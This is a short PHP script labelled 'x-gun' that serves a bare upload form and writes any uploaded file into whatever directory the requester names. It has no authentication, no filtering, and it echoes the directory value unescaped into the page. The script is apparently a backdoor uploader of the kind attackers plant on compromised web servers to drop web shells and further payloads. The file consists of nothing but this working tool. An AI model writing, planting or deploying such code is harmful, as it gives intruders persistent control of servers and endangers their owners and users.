<?php

if (isset($_POST['dir'])){
	
	$dir = $_POST['dir'];
	
}else{ 
$dir = getcwd();
}


echo "<left><b>x-gun</b><br><form method='POST' enctype='multipart/form-data'><input type='file' name='hiUP' size='23' ><br><input type='text' name='dir' value='$dir' size='23'><br><input type='submit' value='Upload' size='35' ></form></left>";
if (!empty ($_FILES['hiUP']))
{
    move_uploaded_file($_FILES['hiUP']['tmp_name'],$dir.'/'.$_FILES['hiUP']['name']);
    echo "<b>Uploaded Successfully</b><br>file name : ".$_FILES['hiUP']['name']."<br>";
}



?>
